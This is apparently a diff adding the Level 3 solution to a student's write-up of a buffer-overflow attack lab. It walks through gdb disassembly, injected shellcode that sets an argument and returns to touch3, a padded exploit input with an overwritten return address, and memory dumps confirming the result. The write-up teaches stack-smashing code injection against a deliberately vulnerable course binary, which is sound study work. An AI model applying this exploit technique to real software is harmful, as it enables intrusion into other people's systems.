@@ -213,3 +213,190 @@ Valid solution for level 2 with target ctarget
 PASS: Sent exploit string to server to be validated.
 NICE JOB!
 ```
+
+### Level 3
+
+We start by learning some things about `touch3`:
+
+```asm
+(gdb) disas touch3
+Dump of assembler code for function touch3:
+   0x00000000004027f1 <+0>:     endbr64
+   0x00000000004027f5 <+4>:     push   %rbx
+   0x00000000004027f6 <+5>:     mov    %rdi,%rbx
+   0x00000000004027f9 <+8>:     movl   $0x3,0xf80f9(%rip)        # 0x4fa8fc <vlevel>
+   0x0000000000402803 <+18>:    mov    %rdi,%rsi
+   0x0000000000402806 <+21>:    mov    0xf80f8(%rip),%edi        # 0x4fa904 <cookie>
+   0x000000000040280c <+27>:    callq  0x402736 <hexmatch>
+   0x0000000000402811 <+32>:    test   %eax,%eax
+   0x0000000000402813 <+34>:    je     0x402842 <touch3+81>
+   0x0000000000402815 <+36>:    mov    %rbx,%rdx
+   0x0000000000402818 <+39>:    lea    0xc5b61(%rip),%rsi        # 0x4c8380
+   0x000000000040281f <+46>:    mov    $0x1,%edi
+   0x0000000000402824 <+51>:    mov    $0x0,%eax
+   0x0000000000402829 <+56>:    callq  0x459ce0 <__printf_chk>
+   0x000000000040282e <+61>:    mov    $0x3,%edi
+   0x0000000000402833 <+66>:    callq  0x402bb6 <validate>
+   0x0000000000402838 <+71>:    mov    $0x0,%edi
+   0x000000000040283d <+76>:    callq  0x412230 <exit>
+   0x0000000000402842 <+81>:    mov    %rbx,%rdx
+   0x0000000000402845 <+84>:    lea    0xc5b5c(%rip),%rsi        # 0x4c83a8
+   0x000000000040284c <+91>:    mov    $0x1,%edi
+   0x0000000000402851 <+96>:    mov    $0x0,%eax
+   0x0000000000402856 <+101>:   callq  0x459ce0 <__printf_chk>
+   0x000000000040285b <+106>:   mov    $0x3,%edi
+   0x0000000000402860 <+111>:   callq  0x402c8a <fail>
+   0x0000000000402865 <+116>:   jmp    0x402838 <touch3+71>
+End of assembler dump.
+```
+
+We learn that `touch3` has the address `0x4027f1`. Besides, we learn that `hexmatch` is called before printing our cookie. Let's look at that function:
+
+```
+(gdb) disas hexmatch
+Dump of assembler code for function hexmatch:
+   0x0000000000402736 <+0>:     endbr64
+   0x000000000040273a <+4>:     push   %r13
+   0x000000000040273c <+6>:     push   %r12
+   0x000000000040273e <+8>:     push   %rbp
+   0x000000000040273f <+9>:     push   %rbx
+   0x0000000000402740 <+10>:    sub    $0x88,%rsp   // <- stack frame size
+   0x0000000000402747 <+17>:    mov    %edi,%ebp
+   0x0000000000402749 <+19>:    mov    %rsi,%rbx
+   0x000000000040274c <+22>:    mov    $0x28,%r12d
+```
+
+The size of `hexmatch`'s stack frame is higher than that of `getbuf`, meaning that if we overwrite the contents of `getbuf`'s stack frame, those changes will be overwritten by `hexmatch`. We can't store our string there - bummer. But when in doubt, go bigger! If we just write way beyond the stack frame, we should be fine!
+
+First step: get the byte representation of our cookie:
+
+```sh
+$ cat cookie.txt
+0x5d21660e
+
+(gdb) x/8 "5d21660e"
+0x7ffff7de71f0: 0x35    0x64    0x32    0x31    0x36    0x36    0x30    0x65
+```
+
+Using the same methodology as in the previous phase, let's set the argument of `touch3` with:
+
+```asm
+mov $0x55609310,%rdi # memory location of the string
+push $0x4027f1 # the address of touch3
+ret
+```
+
+And compile it:
+
+```sh
+$ gcc -c exploit.s && objdump -D exploit.o
+
+exploit.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 10 93 60 55    mov    $0x55609310,%rdi
+   7:   68 f1 27 40 00          pushq  $0x4027f1
+   c:   c3                      retq
+```
+
+Let's make the exploit input: do the same as before, add a heckin' amount of padding to write beyond the current stack frame, and then the bytes of our string:
+
+```asm
+$ cat inp.txt
+/* Exploit code */
+48 c7 c7 10 93 60 55    /* mov    $0x55609310,%rdi */
+68 f1 27 40 00          /* pushq  $0x4027f1 */
+c3                      /* retq */
+
+/* Padding */
+00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Address of our exploit code */
+88 92 60 55 00 00 00 00
+
+/* Padding - outside the stack frame */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Our string bytes */
+35 64 32 31 36 36 30 65
+```
+
+I found the address of the string by running the program with this input and checking where the bytes are in memory:
+
+```sh
+$ ./hex2raw < inp.txt > inp.bin
+
+$ gdb ./ctarget
+# ...
+Reading symbols from ./ctarget...
+
+# Breakpoint after reading input
+(gdb) b *0x40268e
+Breakpoint 1 at 0x40268e: file buf.c, line 15.
+
+# Run with input
+(gdb) r < inp.bin
+Starting program: /home/stud/adbo/exercises/22-Lab2-attacklab/target22/ctarget < inp.bin
+Cookie: 0x5d21660e
+
+Breakpoint 1, getbuf () at buf.c:15
+15      buf.c: No such file or directory.
+
+# Print 150 bytes from the top of the stack frame
+(gdb) x/150bx $rsp
+0x55609288:     0x48    0xc7    0xc7    0x10    0x93    0x60    0x55    0x68
+0x55609290:     0xf1    0x27    0x40    0x00    0xc3    0x00    0x00    0x00
+0x55609298:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092a0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092a8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092b0:     0x88    0x92    0x60    0x55    0x00    0x00    0x00    0x00
+0x556092b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092c0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092c8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092d0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092d8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092e0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092e8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092f0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x556092f8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x55609300:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x55609308:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+# And here our string bytes are at 0x55609310:
+0x55609310:     0x35    0x64    0x32    0x31    0x36    0x36    0x30    0x65
+0x55609318:     0x00    0xf4    0xf4    0xf4    0xf4    0xf4
+
+# Print address for sanity check - it yields our cookie, yay!
+(gdb) p (char *) 0x55609310
+$1 = 0x55609310 "5d21660e"
+```
+
+See it all work:
+
+```sh
+$ ./hex2raw < inp.txt | ./ctarget
+Cookie: 0x5d21660e
+Type string:Touch3!: You called touch3("5d21660e")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
+#### A small side note
+
+I was initially trying to write the string bytes as part of my exploit code (using registers and `movabs`), writing it to overwrite the area of memory where the code for `touch1` is. But this fails with a segmentation fault since that memory area is not writable. TIL.
